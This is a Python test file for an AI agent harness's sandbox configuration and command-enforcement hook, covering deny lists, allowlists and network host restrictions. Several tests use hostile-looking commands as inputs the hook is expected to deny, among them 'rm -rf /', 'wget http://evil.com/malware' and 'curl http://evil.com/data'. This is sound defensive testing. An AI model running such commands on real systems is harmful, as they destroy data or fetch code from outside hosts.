"""
Tests for Sandbox Settings (WS4)

Tests the expanded sandbox configuration including:
- New SandboxConfig fields (excluded_commands, allowed_commands, etc.)
- Sandbox enforcement hook (create_sandbox_enforcement_hook)
- Factory auto-registration of enforcement hook
- VelHarness integration with expanded sandbox parameter
- Backwards compatibility with bool sandbox parameter
"""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from vel_harness.config import DeepAgentConfig, SandboxConfig
from vel_harness.hooks import (
    HookEngine,
    HookMatcher,
    HookResult,
    PreToolUseEvent,
    create_sandbox_enforcement_hook,
)
from vel_harness.factory import create_deep_agent
from vel_harness import VelHarness


# --- SandboxConfig Tests ---


class TestSandboxConfigExpanded:
    """Tests for expanded SandboxConfig fields."""

    def test_default_values(self):
        """Test default values for new fields."""
        config = SandboxConfig()
        assert config.enabled is True
        assert config.auto_allow_execute_if_sandboxed is True
        assert config.excluded_commands == []
        assert config.allowed_commands == []
        assert config.network_allowed_hosts == []
        assert config.max_output_size == 50_000

    def test_custom_values(self):
        """Test custom values for new fields."""
        config = SandboxConfig(
            excluded_commands=["rm -rf", "sudo"],
            allowed_commands=["ls", "cat", "grep"],
            network_allowed_hosts=["api.example.com"],
            max_output_size=100_000,
            auto_allow_execute_if_sandboxed=False,
        )
        assert config.excluded_commands == ["rm -rf", "sudo"]
        assert config.allowed_commands == ["ls", "cat", "grep"]
        assert config.network_allowed_hosts == ["api.example.com"]
        assert config.max_output_size == 100_000
        assert config.auto_allow_execute_if_sandboxed is False

    def test_existing_fields_preserved(self):
        """Test existing fields still work."""
        config = SandboxConfig(
            enabled=True,
            working_dir="/tmp",
            network=True,
            timeout=60,
            allowed_paths=["/home"],
            fallback_unsandboxed=False,
        )
        assert config.working_dir == "/tmp"
        assert config.network is True
        assert config.timeout == 60
        assert config.allowed_paths == ["/home"]
        assert config.fallback_unsandboxed is False


# --- DeepAgentConfig from_dict/to_dict Tests ---


class TestDeepAgentConfigSandboxExpanded:
    """Tests for expanded sandbox in DeepAgentConfig."""

    def test_from_dict_new_fields(self):
        """Test from_dict parses new sandbox fields."""
        config = DeepAgentConfig.from_dict({
            "sandbox": {
                "enabled": True,
                "excluded_commands": ["rm -rf", "sudo"],
                "allowed_commands": ["ls", "cat"],
                "network_allowed_hosts": ["api.example.com"],
                "max_output_size": 100_000,
                "auto_allow_execute_if_sandboxed": False,
            },
        })
        assert config.sandbox.excluded_commands == ["rm -rf", "sudo"]
        assert config.sandbox.allowed_commands == ["ls", "cat"]
        assert config.sandbox.network_allowed_hosts == ["api.example.com"]
        assert config.sandbox.max_output_size == 100_000
        assert config.sandbox.auto_allow_execute_if_sandboxed is False

    def test_from_dict_bool_shorthand(self):
        """Test from_dict with bool shorthand still works."""
        config = DeepAgentConfig.from_dict({"sandbox": False})
        assert config.sandbox.enabled is False
        # New fields should have defaults
        assert config.sandbox.excluded_commands == []
        assert config.sandbox.allowed_commands == []

    def test_from_dict_missing_new_fields_defaults(self):
        """Test from_dict without new fields uses defaults."""
        config = DeepAgentConfig.from_dict({
            "sandbox": {"enabled": True, "network": True},
        })
        assert config.sandbox.excluded_commands == []
        assert config.sandbox.allowed_commands == []
        assert config.sandbox.network_allowed_hosts == []
        assert config.sandbox.max_output_size == 50_000
        assert config.sandbox.auto_allow_execute_if_sandboxed is True

    def test_to_dict_includes_new_fields(self):
        """Test to_dict includes new sandbox fields."""
        config = DeepAgentConfig()
        config.sandbox.excluded_commands = ["sudo"]
        config.sandbox.allowed_commands = ["ls"]
        config.sandbox.network_allowed_hosts = ["localhost"]
        config.sandbox.max_output_size = 10_000

        d = config.to_dict()
        assert d["sandbox"]["excluded_commands"] == ["sudo"]
        assert d["sandbox"]["allowed_commands"] == ["ls"]
        assert d["sandbox"]["network_allowed_hosts"] == ["localhost"]
        assert d["sandbox"]["max_output_size"] == 10_000
        assert d["sandbox"]["auto_allow_execute_if_sandboxed"] is True

    def test_round_trip(self):
        """Test from_dict -> to_dict round trip for sandbox settings."""
        original = {
            "sandbox": {
                "enabled": True,
                "excluded_commands": ["rm -rf"],
                "allowed_commands": ["ls", "cat"],
                "max_output_size": 75_000,
            },
        }
        config = DeepAgentConfig.from_dict(original)
        d = config.to_dict()
        assert d["sandbox"]["excluded_commands"] == ["rm -rf"]
        assert d["sandbox"]["allowed_commands"] == ["ls", "cat"]
        assert d["sandbox"]["max_output_size"] == 75_000


# --- Sandbox Enforcement Hook Tests ---


class TestSandboxEnforcementHook:
    """Tests for create_sandbox_enforcement_hook."""

    @pytest.mark.asyncio
    async def test_excluded_command_blocked(self):
        """Test that excluded commands are blocked."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=["rm -rf", "sudo"],
            allowed_commands=[],
            network_allowed_hosts=[],
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "sudo apt install something"},
        )
        result = await hook.handler(event)
        assert result.decision == "deny"
        assert "sudo" in result.reason

    @pytest.mark.asyncio
    async def test_excluded_command_rm_rf(self):
        """Test rm -rf is blocked."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=["rm -rf"],
            allowed_commands=[],
            network_allowed_hosts=[],
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "rm -rf /"},
        )
        result = await hook.handler(event)
        assert result.decision == "deny"

    @pytest.mark.asyncio
    async def test_non_excluded_command_allowed(self):
        """Test that non-excluded commands pass."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=["rm -rf", "sudo"],
            allowed_commands=[],
            network_allowed_hosts=[],
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "ls -la /tmp"},
        )
        result = await hook.handler(event)
        assert result.decision == "allow"

    @pytest.mark.asyncio
    async def test_allowed_commands_permits_listed(self):
        """Test allowed_commands permits only listed commands."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=[],
            allowed_commands=["ls", "cat", "grep"],
            network_allowed_hosts=[],
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "cat /etc/hosts"},
        )
        result = await hook.handler(event)
        assert result.decision == "allow"

    @pytest.mark.asyncio
    async def test_allowed_commands_blocks_unlisted(self):
        """Test allowed_commands blocks non-listed commands."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=[],
            allowed_commands=["ls", "cat"],
            network_allowed_hosts=[],
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "wget http://evil.com/malware"},
        )
        result = await hook.handler(event)
        assert result.decision == "deny"
        assert "not in allowed list" in result.reason

    @pytest.mark.asyncio
    async def test_empty_allowed_commands_allows_all(self):
        """Test empty allowed_commands means all commands are allowed."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=[],
            allowed_commands=[],
            network_allowed_hosts=[],
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "any-command --flag"},
        )
        result = await hook.handler(event)
        assert result.decision == "allow"

    @pytest.mark.asyncio
    async def test_network_blocked_when_disabled(self):
        """Test network commands blocked when network disabled and host not allowed."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=[],
            allowed_commands=[],
            network_allowed_hosts=["api.safe.com"],
            network_enabled=False,
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "curl http://evil.com/data"},
        )
        result = await hook.handler(event)
        assert result.decision == "deny"
        assert "disallowed host" in result.reason

    @pytest.mark.asyncio
    async def test_network_allowed_for_permitted_host(self):
        """Test network commands allowed for permitted hosts."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=[],
            allowed_commands=[],
            network_allowed_hosts=["api.safe.com"],
            network_enabled=False,
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "curl https://api.safe.com/v1/data"},
        )
        result = await hook.handler(event)
        assert result.decision == "allow"

    @pytest.mark.asyncio
    async def test_network_all_allowed_when_enabled(self):
        """Test network commands allowed when network is enabled."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=[],
            allowed_commands=[],
            network_allowed_hosts=[],
            network_enabled=True,
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "curl http://any-site.com"},
        )
        result = await hook.handler(event)
        assert result.decision == "allow"

    @pytest.mark.asyncio
    async def test_excluded_takes_priority_over_allowed(self):
        """Test excluded_commands takes priority over allowed_commands."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=["sudo"],
            allowed_commands=["sudo apt install"],
            network_allowed_hosts=[],
        )
        event = PreToolUseEvent(
            tool_name="execute",
            tool_input={"command": "sudo apt install vim"},
        )
        result = await hook.handler(event)
        assert result.decision == "deny"

    def test_matcher_targets_execute_tools(self):
        """Test hook matcher targets execute and execute_python."""
        hook = create_sandbox_enforcement_hook(
            excluded_commands=["rm"],
            allowed_commands=[],
            network_allowed_hosts=[],
        )
        assert hook.matches("execute") is True
        assert hook.matches("execute_python") is True
        assert hook.matches("write_file") is False
        assert hook.matches("read_file") is False


# --- HookEngine.add_hooks Tests ---


class TestHookEngineAddHooks:
    """Tests for HookEngine.add_hooks method."""

    def test_add_hooks_to_empty(self):
        """Test adding hooks to an empty engine."""
        engine = HookEngine()
        handler = AsyncMock(return_value=HookResult(decision="allow"))
        engine.add_hooks("pre_tool_use", [HookMatcher(handler=handler)])
        assert engine.has_hooks("pre_tool_use") is True

    def test_add_hooks_extends_existing(self):
        """Test adding hooks extends existing hooks."""
        handler1 = AsyncMock(return_value=HookResult(decision="allow"))
        handler2 = AsyncMock(return_value=HookResult(decision="allow"))
        engine = HookEngine(hooks={
            "pre_tool_use": [HookMatcher(handler=handler1)],
        })
        engine.add_hooks("pre_tool_use", [HookMatcher(handler=handler2)])
        assert len(engine.hooks["pre_tool_use"]) == 2


# --- Factory Integration Tests ---


class TestFactorySandboxEnforcement:
    """Tests that sandbox enforcement hook is auto-wired in factory."""

    def test_no_enforcement_by_default(self):
        """Test no enforcement hook with default config."""
        agent = create_deep_agent()
        assert agent is not None

    def test_enforcement_wired_with_excluded_commands(self):
        """Test enforcement hook auto-registered with excluded_commands."""
        config = DeepAgentConfig.from_dict({
            "sandbox": {
                "enabled": True,
                "excluded_commands": ["rm -rf"],
            },
        })
        agent = create_deep_agent(config=config)
        assert agent is not None
        # Tools should still exist
        tools = agent.get_all_tools()
        assert len(tools) > 0

    def test_enforcement_wired_with_allowed_commands(self):
        """Test enforcement hook auto-registered with allowed_commands."""
        config = DeepAgentConfig.from_dict({
            "sandbox": {
                "enabled": True,
                "allowed_commands": ["ls", "cat"],
            },
        })
        agent = create_deep_agent(config=config)
        assert agent is not None

    def test_enforcement_not_wired_when_sandbox_disabled(self):
        """Test no enforcement when sandbox is disabled."""
        config = DeepAgentConfig.from_dict({
            "sandbox": {
                "enabled": False,
                "excluded_commands": ["rm -rf"],
            },
        })
        agent = create_deep_agent(config=config)
        assert agent is not None

    def test_enforcement_combined_with_user_hooks(self):
        """Test sandbox enforcement coexists with user-provided hooks."""
        user_handler = AsyncMock(return_value=HookResult(decision="allow"))
        user_engine = HookEngine(hooks={
            "pre_tool_use": [HookMatcher(handler=user_handler)],
        })

        config = DeepAgentConfig.from_dict({
            "sandbox": {
                "enabled": True,
                "excluded_commands": ["sudo"],
            },
        })
        agent = create_deep_agent(config=config, hook_engine=user_engine)
        assert agent is not None
        # User engine should now have both user hook + sandbox hook
        assert len(user_engine.hooks["pre_tool_use"]) == 2


# --- VelHarness Integration Tests ---


class TestVelHarnessSandboxExpanded:
    """Tests for expanded sandbox through VelHarness constructor."""

    @pytest.fixture
    def mock_agent(self):
        """Create a mock Vel Agent."""
        with patch("vel_harness.factory.Agent") as MockAgent:
            mock_instance = MagicMock()
            MockAgent.return_value = mock_instance
            yield MockAgent

    def test_bool_backwards_compat(self, mock_agent):
        """Test bool sandbox parameter still works."""
        harness = VelHarness(
            model={"provider": "anthropic", "model": "test"},
            sandbox=True,
        )
        assert harness.config.sandbox.enabled is True

    def test_bool_false(self, mock_agent):
        """Test sandbox=False disables sandbox."""
        harness = VelHarness(
            model={"provider": "anthropic", "model": "test"},
            sandbox=False,
        )
        assert harness.config.sandbox.enabled is False

    def test_dict_config(self, mock_agent):
        """Test dict sandbox config."""
        harness = VelHarness(
            model={"provider": "anthropic", "model": "test"},
            sandbox={
                "enabled": True,
                "excluded_commands": ["rm -rf", "sudo"],
                "allowed_commands": ["ls", "cat"],
            },
        )
        assert harness.config.sandbox.enabled is True
        assert harness.config.sandbox.excluded_commands == ["rm -rf", "sudo"]
        assert harness.config.sandbox.allowed_commands == ["ls", "cat"]

    def test_sandbox_config_instance(self, mock_agent):
        """Test SandboxConfig instance."""
        sc = SandboxConfig(
            enabled=True,
            excluded_commands=["sudo"],
            network_allowed_hosts=["api.safe.com"],
        )
        harness = VelHarness(
            model={"provider": "anthropic", "model": "test"},
            sandbox=sc,
        )
        assert harness.config.sandbox.excluded_commands == ["sudo"]
        assert harness.config.sandbox.network_allowed_hosts == ["api.safe.com"]

    def test_dict_inherits_working_dir(self, mock_agent, tmp_path):
        """Test dict sandbox config inherits working_dir."""
        harness = VelHarness(
            model={"provider": "anthropic", "model": "test"},
            working_directory=str(tmp_path),
            sandbox={"enabled": True, "excluded_commands": ["sudo"]},
        )
        assert harness.config.sandbox.working_dir == str(tmp_path)

    def test_sandbox_config_preserves_working_dir(self, mock_agent, tmp_path):
        """Test SandboxConfig with explicit working_dir takes priority."""
        sandbox_dir = tmp_path / "sandbox"
        sandbox_dir.mkdir()
        sc = SandboxConfig(
            enabled=True,
            working_dir=str(sandbox_dir),
        )
        harness = VelHarness(
            model={"provider": "anthropic", "model": "test"},
            working_directory=str(tmp_path),
            sandbox=sc,
        )
        assert harness.config.sandbox.working_dir == str(sandbox_dir)

    def test_sandbox_with_all_features(self, mock_agent):
        """Test sandbox coexists with other features."""
        harness = VelHarness(
            model={"provider": "anthropic", "model": "test"},
            caching=True,
            retry=True,
            reasoning="prompted",
            sandbox={
                "enabled": True,
                "excluded_commands": ["sudo"],
            },
        )
        assert harness.config.sandbox.excluded_commands == ["sudo"]
        assert harness.config.caching.enabled is True
        assert harness.config.retry.enabled is True
        assert harness.reasoning_config.mode == "prompted"
